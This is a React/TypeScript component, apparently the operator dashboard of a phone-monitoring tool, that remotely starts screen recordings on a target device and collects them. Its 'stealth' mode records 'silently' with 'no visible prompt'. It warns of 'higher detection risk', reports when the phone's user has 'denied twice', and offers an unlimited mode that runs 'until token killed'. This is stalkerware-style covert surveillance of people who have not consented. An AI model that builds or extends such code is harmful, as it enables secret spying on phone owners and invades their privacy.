"use client";

import React, { useState, useEffect, useRef, useCallback } from 'react';
import {
    Video, Square, Play, Clock, Download, Trash2,
    AlertTriangle, CheckCircle, AlertCircle, X,
    Zap, Shield, Repeat2, ChevronRight
} from 'lucide-react';

interface ScreenRecordViewProps {
    socket: any;
    userUuid: string;
    selectedDeviceId: string | null;
    isOnline: boolean;
    deviceName?: string;
}

interface SavedRecording {
    id: string;
    url: string;
    timestamp: number;
    elapsedMs: number;
    totalMs: number;
    reason: string;
    mode?: string;
}

const DURATIONS = [
    { label: '2m',  value: 120 },
    { label: '5m',  value: 300 },
    { label: '10m', value: 600 },
];

const STORAGE_KEY = (deviceId: string) => `asml_recs_${deviceId}`;

function fmt(ms: number) {
    const s = Math.floor(ms / 1000);
    return `${Math.floor(s / 60)}:${String(s % 60).padStart(2, '0')}`;
}

function fmtReason(r: string) {
    if (r === 'duration_complete') return 'Completed';
    if (r === 'manual_stop')      return 'Stopped';
    if (r === 'token_released')   return 'Token released';
    if (r === 'encoder_error')    return 'Error';
    return 'Done';
}

function timeAgo(ts: number) {
    const d = Math.floor((Date.now() - ts) / 1000);
    if (d < 60)   return 'Just now';
    if (d < 3600) return `${Math.floor(d / 60)}m ago`;
    if (d < 86400) return `${Math.floor(d / 3600)}h ago`;
    return new Date(ts).toLocaleDateString();
}

export default function ScreenRecordView({
    socket, userUuid, selectedDeviceId, isOnline, deviceName
}: ScreenRecordViewProps) {

    const [hasToken,     setHasToken]     = useState<boolean | null>(null);
    const [isRecording,  setIsRecording]  = useState(false);
    const [pendingRec,   setPendingRec]   = useState(false);
    const [recMode,      setRecMode]      = useState<'stealth' | 'simple'>('stealth');
    const [recDuration,  setRecDuration]  = useState(300);
    const [customMin,    setCustomMin]    = useState('');
    const [showCustom,   setShowCustom]   = useState(false);
    const [isUnlimited,  setIsUnlimited]  = useState(false);
    const [recElapsedMs, setRecElapsedMs] = useState(0);
    const [recTotalMs,   setRecTotalMs]   = useState(0);
    const [savedRecs,    setSavedRecs]    = useState<SavedRecording[]>([]);
    const [toast,        setToast]        = useState<{ type: 'ok'|'warn'|'err'; text: string } | null>(null);
    const [playingRec,   setPlayingRec]   = useState<SavedRecording | null>(null);
    const [showSimpleWarn, setShowSimpleWarn] = useState(false);
    const [showUnlimWarn,  setShowUnlimWarn]  = useState(false);

    const isRecordingRef = useRef(false);
    isRecordingRef.current = isRecording;

    // ── Toast helper ──────────────────────────────────────────────────────────
    const showToast = useCallback((type: 'ok'|'warn'|'err', text: string, ms = 4000) => {
        setToast({ type, text });
        setTimeout(() => setToast(null), ms);
    }, []);

    // ── Persist recordings in localStorage ────────────────────────────────────
    useEffect(() => {
        if (!selectedDeviceId) return;
        try {
            const raw = localStorage.getItem(STORAGE_KEY(selectedDeviceId));
            if (raw) setSavedRecs(JSON.parse(raw));
        } catch {}
    }, [selectedDeviceId]);

    const persist = useCallback((recs: SavedRecording[], devId: string) => {
        try { localStorage.setItem(STORAGE_KEY(devId), JSON.stringify(recs.slice(0, 20))); } catch {}
    }, []);

    const addRec = useCallback((rec: SavedRecording) => {
        setSavedRecs(prev => {
            const next = [rec, ...prev.slice(0, 19)];
            if (selectedDeviceId) persist(next, selectedDeviceId);
            return next;
        });
    }, [selectedDeviceId, persist]);

    const deleteRec = useCallback((id: string) => {
        setSavedRecs(prev => {
            const next = prev.filter(r => r.id !== id);
            if (selectedDeviceId) persist(next, selectedDeviceId);
            return next;
        });
    }, [selectedDeviceId, persist]);

    // ── Socket ────────────────────────────────────────────────────────────────
    useEffect(() => {
        if (!socket) return;
        if (selectedDeviceId && isOnline) {
            socket.emit('screen_status_query', { uuid: userUuid, targetDeviceId: selectedDeviceId });
        }

        const onStatus = (data: any) => {
            if (!data) return;
            if (data.hasToken !== undefined) setHasToken(!!data.hasToken);
            switch (data.status) {
                case 'token_needed':
                    setHasToken(false);
                    // don't touch pendingRec here — operator controls that via button
                    break;
                case 'authorized':
                    setHasToken(true);
                    break;
                case 'recording_started':
                    setIsRecording(true); setPendingRec(false);
                    setRecElapsedMs(0);
                    setRecTotalMs((data.durationSec || 0) * 1000);
                    showToast('ok', '● Recording started');
                    break;
                case 'stream_stopped':
                case 'no_token':
                    setHasToken(false); setIsRecording(false); setPendingRec(false);
                    break;
                case 'stealth_timeout':
                    setPendingRec(false);
                    showToast('warn', 'Stealth timeout — no activity detected', 6000);
                    break;
                case 'denied':
                    setIsRecording(false); setPendingRec(false); setHasToken(false);
                    showToast('err', data.error || 'Permission denied');
                    break;
                case 'permission_never_granted':
                    setIsRecording(false); setPendingRec(false); setHasToken(false);
                    showToast('err', 'User denied twice — stealth disarmed', 8000);
                    break;
            }
        };

        const onProgress = (data: any) => {
            if (!data) return;
            setIsRecording(true); setPendingRec(false);
            setRecElapsedMs(data.elapsedMs || 0);
            setRecTotalMs(data.totalMs || 0);
        };

        const onComplete = (data: any) => {
            if (!data) return;
            setIsRecording(false); setPendingRec(false);
            setRecElapsedMs(0); setRecTotalMs(0);
            if (data.url) {
                addRec({
                    id: `rec_${Date.now()}`,
                    url: data.url,
                    timestamp: data.timestamp || Date.now(),
                    elapsedMs: data.elapsedMs || 0,
                    totalMs:   data.totalMs   || 0,
                    reason:    data.reason    || 'unknown',
                    mode:      data.mode
                });
                showToast('ok', `Saved — ${fmt(data.elapsedMs || 0)}`);
            }
        };

        socket.on('screen_status',       onStatus);
        socket.on('screen_rec_progress', onProgress);
        socket.on('screen_rec_complete', onComplete);

        return () => {
            if (isRecordingRef.current) {
                socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
            }
            socket.off('screen_status',       onStatus);
            socket.off('screen_rec_progress', onProgress);
            socket.off('screen_rec_complete', onComplete);
        };
    }, [socket, selectedDeviceId, isOnline, userUuid, showToast, addRec]);

    // ── Actions ───────────────────────────────────────────────────────────────
    const fireStart = useCallback(() => {
        if (!selectedDeviceId || !socket) return;
        const duration = isUnlimited ? 86400 : recDuration;
        setPendingRec(true); setRecElapsedMs(0); setRecTotalMs(duration * 1000);
        socket.emit('screen_record_start', {
            uuid: userUuid, targetDeviceId: selectedDeviceId, duration, mode: recMode
        });
        if (recMode === 'stealth') showToast('ok', 'Stealth armed');
        else showToast('warn', 'Prompt sent to phone...');
    }, [selectedDeviceId, socket, userUuid, recMode, recDuration, isUnlimited, showToast]);

    const handleStart = () => {
        if (!selectedDeviceId || !isOnline || !socket || isRecording || pendingRec) return;
        if (recMode === 'simple') { setShowSimpleWarn(true); return; }
        if (isUnlimited)          { setShowUnlimWarn(true); return; }
        fireStart();
    };

    const handleStop = () => {
        if (!selectedDeviceId || !socket) return;
        socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
        setIsRecording(false); setPendingRec(false);
    };

    const pct = recTotalMs > 0 ? Math.min((recElapsedMs / recTotalMs) * 100, 100) : 0;

    // ── Render ────────────────────────────────────────────────────────────────
    return (
        <div className="relative w-full max-w-xl mx-auto space-y-2.5 pb-24 px-3 sm:px-0">

            {/* ── Toast ──────────────────────────────────────────────────────── */}
            {toast && (
                <div className={`fixed top-4 left-1/2 -translate-x-1/2 z-[600] flex items-center gap-2.5 px-4 py-2.5 rounded-2xl text-xs font-semibold shadow-xl backdrop-blur-xl border transition-all animate-in slide-in-from-top-3 ${
                    toast.type === 'ok'   ? 'bg-emerald-900/80 border-emerald-500/30 text-emerald-300'
                  : toast.type === 'err'  ? 'bg-rose-900/80    border-rose-500/30    text-rose-300'
                  :                         'bg-amber-900/80   border-amber-500/30   text-amber-300'
                }`}>
                    {toast.type === 'ok' ? <CheckCircle size={13}/> : <AlertCircle size={13}/>}
                    {toast.text}
                </div>
            )}

            {/* ── Device pill ────────────────────────────────────────────────── */}
            <div className="flex items-center justify-between px-1">
                <div className="flex items-center gap-1.5">
                    <span className={`w-1.5 h-1.5 rounded-full ${isOnline ? 'bg-emerald-400' : 'bg-white/20'}`}/>
                    <span className="text-[11px] text-white/30 font-medium tracking-wide">{deviceName || 'No device selected'}</span>
                </div>
                {hasToken !== null && (
                    <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full ${
                        hasToken ? 'bg-emerald-500/10 text-emerald-400' : 'bg-white/5 text-white/20'
                    }`}>{hasToken ? 'Active' : 'No token'}</span>
                )}
            </div>

            {/* ── Mode ───────────────────────────────────────────────────────── */}
            <div className="clay-card p-3 space-y-2">
                <p className="text-[10px] font-semibold uppercase tracking-widest text-white/20 px-0.5">Mode</p>
                <div className="grid grid-cols-2 gap-2">
                    {([['stealth', 'Stealth', Shield], ['simple', 'Simple', Zap]] as const).map(([val, label, Icon]) => (
                        <button key={val}
                            onClick={() => setRecMode(val)}
                            disabled={isRecording || pendingRec}
                            className={`group relative p-3 rounded-xl text-left transition-all disabled:opacity-40 border overflow-hidden ${
                                recMode === val
                                    ? 'bg-orange-500/10 border-orange-500/40'
                                    : 'bg-white/[0.03] border-white/[0.06] hover:border-white/10'
                            }`}
                        >
                            <Icon size={14} className={recMode === val ? 'text-orange-400 mb-1.5' : 'text-white/25 mb-1.5'} />
                            <p className={`text-xs font-bold ${recMode === val ? 'text-white' : 'text-white/40'}`}>{label}</p>
                            <p className="text-[10px] text-white/20 mt-0.5 leading-relaxed">
                                {val === 'stealth' ? 'Silent, no visible prompt' : 'Prompt appears on phone'}
                            </p>
                        </button>
                    ))}
                </div>
            </div>

            {/* ── Duration ───────────────────────────────────────────────────── */}
            <div className="clay-card p-3 space-y-2">
                <p className="text-[10px] font-semibold uppercase tracking-widest text-white/20 px-0.5">Duration</p>
                <div className="flex gap-1.5">
                    {DURATIONS.map(d => (
                        <button key={d.value}
                            onClick={() => { setRecDuration(d.value); setIsUnlimited(false); setShowCustom(false); setCustomMin(''); }}
                            disabled={isRecording || pendingRec}
                            className={`flex-1 py-2 rounded-xl text-xs font-bold transition-all disabled:opacity-40 ${
                                recDuration === d.value && !showCustom && !isUnlimited
                                    ? 'bg-orange-500 text-white shadow-[0_0_16px_rgba(249,115,22,0.3)]'
                                    : 'bg-white/5 text-white/40 hover:text-white/70'
                            }`}
                        >{d.label}</button>
                    ))}
                    <button
                        onClick={() => { setShowCustom(true); setIsUnlimited(false); setRecDuration(0); }}
                        disabled={isRecording || pendingRec}
                        className={`flex-1 py-2 rounded-xl text-xs font-bold transition-all disabled:opacity-40 ${
                            showCustom ? 'bg-orange-500 text-white shadow-[0_0_16px_rgba(249,115,22,0.3)]' : 'bg-white/5 text-white/40 hover:text-white/70'
                        }`}
                    >Custom</button>
                </div>

                {showCustom && (
                    <div className="flex items-center gap-2 bg-black/30 rounded-xl px-3 py-2 border border-orange-500/20">
                        <input
                            type="number" min={1} max={10} value={customMin}
                            onChange={e => {
                                setCustomMin(e.target.value);
                                const n = parseInt(e.target.value, 10);
                                if (!isNaN(n) && n >= 1 && n <= 10) setRecDuration(n * 60);
                            }}
                            placeholder="1–10"
                            className="bg-transparent text-white text-sm font-semibold w-12 outline-none placeholder:text-white/20"
                        />
                        <span className="text-[10px] text-white/25">min (max 10)</span>
                        {recDuration > 0 && <span className="ml-auto text-xs text-orange-400 font-bold">{recDuration / 60}m</span>}
                    </div>
                )}

                <button
                    onClick={() => { setIsUnlimited(!isUnlimited); setShowCustom(false); setCustomMin(''); }}
                    disabled={isRecording || pendingRec}
                    className={`w-full py-2 rounded-xl text-xs font-semibold flex items-center justify-center gap-2 transition-all disabled:opacity-40 border ${
                        isUnlimited
                            ? 'bg-amber-500/10 border-amber-500/30 text-amber-300'
                            : 'bg-white/[0.02] border-white/[0.06] text-white/25 hover:text-white/40'
                    }`}
                >
                    <Repeat2 size={12}/>
                    <span>Until token killed</span>
                    {isUnlimited && <span className="text-[10px] text-amber-400/50 ml-1">— higher detection risk</span>}
                </button>
            </div>

            {/* ── Record button / state ──────────────────────────────────────── */}
            <div className="clay-card p-3">
                {!isRecording && !pendingRec ? (
                    <button
                        onClick={handleStart}
                        disabled={!isOnline || !selectedDeviceId || (showCustom && recDuration <= 0)}
                        className={`w-full py-3.5 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all disabled:opacity-30 disabled:cursor-not-allowed shadow-lg ${
                            recMode === 'stealth'
                                ? 'bg-gradient-to-r from-orange-500 to-amber-500 text-white shadow-[0_4px_20px_rgba(249,115,22,0.35)]'
                                : 'bg-gradient-to-r from-orange-500 to-amber-500 text-white shadow-[0_4px_20px_rgba(249,115,22,0.35)]'
                        } hover:brightness-110 active:scale-[0.99]`}
                    >
                        <Play size={15} className="fill-current"/>
                        {recMode === 'stealth' ? 'Arm Stealth' : 'Start Recording'}
                    </button>

                ) : pendingRec && !isRecording ? (
                    <div className="space-y-2">
                        <div className="flex items-center gap-3 py-3 px-4 rounded-xl bg-amber-500/8 border border-amber-500/20">
                            <Clock size={14} className="text-amber-400 animate-spin shrink-0"/>
                            <span className="text-xs font-medium text-amber-300/80">
                                {recMode === 'stealth' ? 'Screen Rec — Armed' : 'Waiting for permission...'}
                            </span>
                        </div>
                        <button onClick={handleStop}
                            className="w-full py-2 rounded-xl text-[11px] text-white/25 hover:text-rose-400 hover:bg-rose-500/8 transition-all border border-transparent hover:border-rose-500/15"
                        >Cancel</button>
                    </div>

                ) : (
                    <div className="space-y-2.5">
                        <div className="flex items-center justify-between">
                            <div className="flex items-center gap-2">
                                <span className="w-2 h-2 rounded-full bg-rose-500 animate-pulse shadow-[0_0_8px_#f43f5e]"/>
                                <span className="text-xs font-bold text-white/80">Recording</span>
                            </div>
                            <span className="text-xs font-mono text-white/40">
                                {fmt(recElapsedMs)}{recTotalMs > 0 && !isUnlimited ? ` / ${fmt(recTotalMs)}` : ''}
                            </span>
                        </div>
                        {!isUnlimited && recTotalMs > 0 && (
                            <div className="h-1 rounded-full bg-white/5 overflow-hidden">
                                <div className="h-full rounded-full bg-gradient-to-r from-orange-500 to-amber-400 transition-all duration-1000" style={{ width: `${pct}%` }}/>
                            </div>
                        )}
                        <button onClick={handleStop}
                            className="w-full py-2.5 rounded-xl text-xs font-semibold flex items-center justify-center gap-2 bg-rose-500/10 border border-rose-500/20 text-rose-400 hover:bg-rose-500/15 transition-all"
                        >
                            <Square size={11} className="fill-current"/> Stop
                        </button>
                    </div>
                )}
            </div>

            {/* ── Stealth note ───────────────────────────────────────────────── */}
            {recMode === 'stealth' && !isRecording && !pendingRec && (
                <p className="text-[11px] text-white/20 text-center px-4 leading-relaxed">
                    Completely silent — no prompt appears. Recordings arrive here automatically.
                </p>
            )}

            {/* ── Recordings list ────────────────────────────────────────────── */}
            {savedRecs.length > 0 && (
                <div className="clay-card overflow-hidden">
                    <div className="px-4 py-2.5 flex items-center justify-between border-b border-white/[0.04]">
                        <span className="text-[11px] font-semibold text-white/30 uppercase tracking-wider">Recordings ({savedRecs.length})</span>
                        <button onClick={() => { setSavedRecs([]); if (selectedDeviceId) persist([], selectedDeviceId); }}
                            className="text-[10px] text-white/15 hover:text-rose-400 transition-colors"
                        >Clear all</button>
                    </div>
                    <div className="divide-y divide-white/[0.03]">
                        {savedRecs.map(rec => (
                            <div key={rec.id} className="flex items-center gap-3 px-4 py-3 hover:bg-white/[0.02] transition-colors group">
                                {/* Play button */}
                                <button
                                    onClick={() => setPlayingRec(rec)}
                                    className="w-9 h-9 rounded-xl bg-orange-500/10 border border-orange-500/20 flex items-center justify-center text-orange-400 hover:bg-orange-500/20 transition-all shrink-0"
                                >
                                    <Play size={13} className="fill-current ml-0.5"/>
                                </button>

                                <div className="flex-1 min-w-0">
                                    <div className="flex items-center gap-2">
                                        <span className="text-xs font-semibold text-white/70 font-mono">{fmt(rec.elapsedMs)}</span>
                                        <span className={`text-[9px] px-1.5 py-0.5 rounded-md font-semibold uppercase tracking-wide ${
                                            rec.mode === 'stealth' ? 'bg-orange-500/10 text-orange-400' : 'bg-white/8 text-white/30'
                                        }`}>{rec.mode || 'rec'}</span>
                                    </div>
                                    <p className="text-[10px] text-white/20 mt-0.5">{timeAgo(rec.timestamp)} · {fmtReason(rec.reason)}</p>
                                </div>

                                <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                                    <a href={rec.url} download
                                        className="p-1.5 rounded-lg text-white/25 hover:text-white hover:bg-white/8 transition-all"
                                        title="Download"
                                    ><Download size={12}/></a>
                                    <button onClick={() => deleteRec(rec.id)}
                                        className="p-1.5 rounded-lg text-white/20 hover:text-rose-400 hover:bg-rose-500/10 transition-all"
                                        title="Delete"
                                    ><Trash2 size={12}/></button>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            )}

            {savedRecs.length === 0 && !isRecording && !pendingRec && (
                <div className="py-12 flex flex-col items-center gap-2 text-center">
                    <div className="w-10 h-10 rounded-2xl bg-white/[0.03] border border-white/[0.06] flex items-center justify-center">
                        <Video size={16} className="text-white/15"/>
                    </div>
                    <p className="text-[11px] text-white/20">No recordings yet</p>
                </div>
            )}

            {/* ── Inline video player modal ──────────────────────────────────── */}
            {playingRec && (
                <div
                    className="fixed inset-0 z-[500] bg-black/90 backdrop-blur-md flex items-center justify-center p-4"
                    onClick={() => setPlayingRec(null)}
                >
                    <div className="w-full max-w-sm space-y-2" onClick={e => e.stopPropagation()}>
                        <div className="flex items-center justify-between px-1">
                            <div>
                                <p className="text-xs font-semibold text-white/60 font-mono">{fmt(playingRec.elapsedMs)} recording</p>
                                <p className="text-[10px] text-white/25">{timeAgo(playingRec.timestamp)} · {fmtReason(playingRec.reason)}</p>
                            </div>
                            <div className="flex items-center gap-2">
                                <a href={playingRec.url} download
                                    className="p-2 rounded-xl bg-white/8 text-white/50 hover:text-white hover:bg-white/12 transition-all"
                                ><Download size={14}/></a>
                                <button onClick={() => setPlayingRec(null)}
                                    className="p-2 rounded-xl bg-white/8 text-white/50 hover:text-white transition-all"
                                ><X size={14}/></button>
                            </div>
                        </div>
                        <video
                            src={playingRec.url}
                            controls autoPlay
                            className="w-full rounded-2xl bg-black border border-white/10 max-h-[70vh] object-contain"
                            style={{ aspectRatio: '9/16' }}
                        />
                    </div>
                </div>
            )}

            {/* ── Simple mode warning ────────────────────────────────────────── */}
            {showSimpleWarn && (
                <div className="fixed inset-0 z-[600] bg-black/80 backdrop-blur-sm flex items-end sm:items-center justify-center p-4">
                    <div className="clay-card w-full max-w-sm p-5 border border-amber-500/25 space-y-4 animate-in slide-in-from-bottom-3">
                        <div className="flex items-center gap-2 text-amber-400">
                            <AlertTriangle size={16}/>
                            <span className="font-bold text-sm">Visible Prompt</span>
                        </div>
                        <p className="text-xs text-white/50 leading-relaxed">
                            A <span className="text-white font-semibold">"Start now?"</span> dialog will appear on the phone screen immediately.
                        </p>
                        <div className="flex gap-2">
                            <button onClick={() => setShowSimpleWarn(false)}
                                className="flex-1 py-2.5 rounded-xl text-xs font-semibold text-white/40 border border-white/8 hover:border-white/15 transition-all"
                            >Cancel</button>
                            <button onClick={() => { setShowSimpleWarn(false); fireStart(); }}
                                className="flex-1 py-2.5 rounded-xl text-xs font-bold bg-amber-500 hover:bg-amber-400 text-black transition-all"
                            >Send Prompt</button>
                        </div>
                    </div>
                </div>
            )}

            {/* ── Unlimited warning ──────────────────────────────────────────── */}
            {showUnlimWarn && (
                <div className="fixed inset-0 z-[600] bg-black/80 backdrop-blur-sm flex items-end sm:items-center justify-center p-4">
                    <div className="clay-card w-full max-w-sm p-5 border border-rose-500/25 space-y-4 animate-in slide-in-from-bottom-3">
                        <div className="flex items-center gap-2 text-rose-400">
                            <AlertTriangle size={16}/>
                            <span className="font-bold text-sm">Unlimited Recording</span>
                        </div>
                        <p className="text-xs text-white/50 leading-relaxed">
                            Recording runs until token is killed. May trigger battery or performance warnings on some devices.
                        </p>
                        <div className="flex gap-2">
                            <button onClick={() => setShowUnlimWarn(false)}
                                className="flex-1 py-2.5 rounded-xl text-xs font-semibold text-white/40 border border-white/8 hover:border-white/15 transition-all"
                            >Cancel</button>
                            <button onClick={() => { setShowUnlimWarn(false); fireStart(); }}
                                className="flex-1 py-2.5 rounded-xl text-xs font-bold bg-rose-500 hover:bg-rose-400 text-white transition-all"
                            >Arm Anyway</button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
